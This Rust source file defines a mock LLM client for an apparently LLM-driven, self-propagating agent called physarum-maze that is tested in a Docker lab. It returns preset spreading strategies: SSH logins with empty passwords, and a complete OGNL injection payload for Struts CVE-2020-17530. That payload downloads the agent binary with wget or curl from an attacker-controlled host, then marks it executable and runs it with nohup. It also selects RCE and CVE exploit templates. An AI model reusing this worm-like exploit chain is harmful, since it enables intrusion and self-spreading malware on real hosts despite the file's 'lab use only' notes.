use std::sync::Arc;

use crate::{
    client::{QueryFuture, TemplateFuture},
    types::{
        ArtifactType, DiscoveryQuery, PropagationMethod, PropagationStrategy,
        TemplateSelectionQuery, TemplateSelectionResponse,
    },
    types::{BootstrapPlan, BootstrapStep, ExpectedResult},
    LlmClient,
};

/// Deterministic LLM client for testing and Docker Lab validation.
///
/// Returns a preset `PropagationStrategy` on every `query_propagation` call.
/// For `select_templates`, returns all templates whose tags include 'rce' or 'cve*'
/// — matching the static `PHYSARUM_TEMPLATE_TAGS=rce,cve` filter behaviour so that
/// dry-runs produce the same result as the current tag-filtered approach.
///
/// No network, no API key, no external dependency. Used in:
///   - unit and integration tests
///   - Docker Lab dry-runs where a real LLM endpoint is not available
///   - CI runs
pub struct MockLlmClient {
    strategy: Arc<PropagationStrategy>,
}

impl MockLlmClient {
    pub fn new(strategy: PropagationStrategy) -> Self {
        Self {
            strategy: Arc::new(strategy),
        }
    }

    /// Returns `PropagationMethod::NoPath` — simulates a target the LLM
    /// cannot find a propagation path to.
    pub fn no_path(reason: impl Into<String>) -> Self {
        Self::new(PropagationStrategy {
            method: PropagationMethod::NoPath {
                reason: reason.into(),
            },
            artifact_type: ArtifactType::None,
            bootstrap_plan: None,
            confidence: 1.0,
            reasoning_summary: "Mock: no propagation path available.".into(),
            preconditions: vec![],
            validation_check: None,
            safety_notes: vec!["Mock client — lab use only.".into()],
        })
    }

    /// Returns an SSH strategy targeting `user` with empty-password auth.
    pub fn ssh_empty_password(user: impl Into<String>, confidence: f32) -> Self {
        let u = user.into();
        Self::new(PropagationStrategy {
            method: PropagationMethod::Ssh {
                user: u.clone(),
                auth: crate::types::SshAuth::EmptyPassword,
            },
            artifact_type: ArtifactType::AgentBinary,
            bootstrap_plan: None,
            confidence,
            reasoning_summary: format!("Mock: SSH empty-password attempt as user '{u}'."),
            preconditions: vec!["Port 22 open".into()],
            validation_check: Some("SSH connection succeeds".into()),
            safety_notes: vec!["Mock client — lab use only.".into()],
        })
    }

    /// Returns an HTTP strategy for a given path (no bootstrap plan).
    pub fn http_get(path: impl Into<String>, confidence: f32) -> Self {
        let p = path.into();
        Self::new(PropagationStrategy {
            method: PropagationMethod::Http {
                path: p.clone(),
                http_method: crate::types::HttpMethod::Get,
                headers: vec![],
                port: None,
            },
            artifact_type: ArtifactType::HttpRequest,
            bootstrap_plan: None,
            confidence,
            reasoning_summary: format!("Mock: HTTP GET {p}."),
            preconditions: vec!["Port 80 or 8080 open".into()],
            validation_check: Some("HTTP 200 response".into()),
            safety_notes: vec!["Mock client — lab use only.".into()],
        })
    }

    /// Returns an Exploit strategy for CVE-2020-17530 (Struts S2-059 OGNL injection).
    ///
    /// Used by `--llm-endpoint mock-exploit` in the Docker Lab Phase 2 dry-run:
    /// validates the full exploit pipeline (binary server, OGNL HttpPost, nohup exec)
    /// without a real LLM. The executor fires a real HttpPost with the OGNL header.
    ///
    /// `source_ip` must match the agent's IP on the internal lab network.
    /// `target_port` is the HTTP port where Container B listens (e.g. 8080).
    pub fn exploit_struts_s2_059(
        source_ip: impl Into<String>,
        target_port: u16,
        confidence: f32,
    ) -> Self {
        let src = source_ip.into();
        let cmd = format!(
            "mkdir -p /tmp/physarum && \
             (wget -q http://{src}:8001/physarum-maze -O /tmp/physarum/physarum-maze \
              || curl -s -o /tmp/physarum/physarum-maze http://{src}:8001/physarum-maze) && \
             chmod +x /tmp/physarum/physarum-maze && \
             nohup /tmp/physarum/physarum-maze --mode propagated \
               >/tmp/physarum/agent.log 2>&1 &"
        );
        // S2-059 OGNL Content-Type payload — #process.waitFor() blocks until the
        // shell exits. With `nohup ... &` the shell forks and returns in milliseconds.
        let ognl = format!(
            "%{{(#_='multipart/form-data').\
             (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\
             (#_memberAccess?(#_memberAccess=#dm):\
               ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\
                (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\
                (#ognlUtil.getExcludedPackageNames().clear()).\
                (#ognlUtil.getExcludedClasses().clear()).\
                (#context.setMemberAccess(#dm)))).\
             (#cmd='{cmd}').\
             (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\
             (#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:{{'/bin/sh','-c',#cmd}})).\
             (#p=new java.lang.ProcessBuilder(#cmds)).\
             (#p.redirectErrorStream(true)).\
             (#process=#p.start()).\
             (#process.waitFor())}}.multipart/form-data",
            cmd = cmd
        );

        Self::new(PropagationStrategy {
            method: crate::types::PropagationMethod::Exploit {
                cve: "CVE-2020-17530".into(),
            },
            artifact_type: ArtifactType::AgentBinary,
            bootstrap_plan: Some(BootstrapPlan {
                steps: vec![BootstrapStep {
                    action: crate::types::BootstrapAction::HttpPost {
                        path: "/showcase.action".into(),
                        body: String::new(),
                        port: Some(target_port),
                        headers: vec![("Content-Type".into(), ognl)],
                        accept_any_response: true,
                    },
                    target: String::new(), // filled at runtime from target IP
                    timeout_ms: 10_000,
                    requires_root: false,
                    expected_result: ExpectedResult {
                        success_indicator: "OGNL fired (any HTTP status)".into(),
                        failure_indicator: Some("Connection refused or timeout".into()),
                    },
                }],
            }),
            confidence,
            reasoning_summary: format!(
                "Mock: CVE-2020-17530 S2-059 OGNL exploit → wget physarum-maze from {src}:8001 → nohup exec."
            ),
            preconditions: vec![
                "Port open (Struts 2.5.x HTTP)".into(),
                "CVE-2020-17530 template confirmed".into(),
                "physarum-maze binary server running on source_ip:8001".into(),
            ],
            validation_check: Some("/tmp/physarum/physarum-maze exists on target".into()),
            safety_notes: vec![
                "Mock exploit client — Docker Lab Phase 2 only.".into(),
                "OGNL executes arbitrary commands on target.".into(),
            ],
        })
    }

    /// Returns an HTTP strategy WITH a real bootstrap plan (HttpGet step).
    ///
    /// Used by `--llm-endpoint mock-http` in the Docker Lab to prove the full
    /// pipeline end-to-end without a real LLM. The executor performs a real HTTP
    /// GET against the target so Container B must be reachable on the specified port.
    pub fn http_probe_with_plan(path: impl Into<String>, confidence: f32) -> Self {
        let p = path.into();
        Self::new(PropagationStrategy {
            method: PropagationMethod::Http {
                path: p.clone(),
                http_method: crate::types::HttpMethod::Get,
                headers: vec![],
                port: None,
            },
            artifact_type: ArtifactType::HttpRequest,
            bootstrap_plan: Some(BootstrapPlan {
                steps: vec![BootstrapStep {
                    action: crate::types::BootstrapAction::HttpGet {
                        path: p.clone(),
                        port: None,
                    },
                    target: String::new(), // filled at runtime from target IP
                    timeout_ms: 5_000,
                    requires_root: false,
                    expected_result: ExpectedResult {
                        success_indicator: "HTTP 200".into(),
                        failure_indicator: Some("HTTP 4xx/5xx or timeout".into()),
                    },
                }],
            }),
            confidence,
            reasoning_summary: format!("Mock HTTP probe: GET {p} — Docker Lab cycle validation."),
            preconditions: vec!["Port 80 open".into()],
            validation_check: Some("HTTP 200 from target".into()),
            safety_notes: vec!["Mock client — Docker Lab only.".into()],
        })
    }
}

impl LlmClient for MockLlmClient {
    fn select_templates<'a>(&'a self, query: &'a TemplateSelectionQuery) -> TemplateFuture<'a> {
        // Mock selection: return all templates with rce or cve* tags.
        // This replicates the static PHYSARUM_TEMPLATE_TAGS=rce,cve filter
        // so dry-runs produce consistent results.
        let selected_ids: Vec<String> = query
            .available_templates
            .iter()
            .filter(|t| {
                t.tags.iter().any(|tag| {
                    let t = tag.to_ascii_lowercase();
                    t == "rce" || t.starts_with("cve")
                }) || t.id.starts_with("CVE-")
            })
            .map(|t| t.id.clone())
            .collect();

        let count = selected_ids.len();
        Box::pin(async move {
            Ok(TemplateSelectionResponse {
                selected_ids,
                reasoning: format!(
                    "Mock: selected {count} rce/cve templates from catalog."
                ),
            })
        })
    }

    fn query_propagation<'a>(&'a self, _query: &'a DiscoveryQuery) -> QueryFuture<'a> {
        let strategy = Arc::clone(&self.strategy);
        Box::pin(async move { Ok((*strategy).clone()) })
    }
}
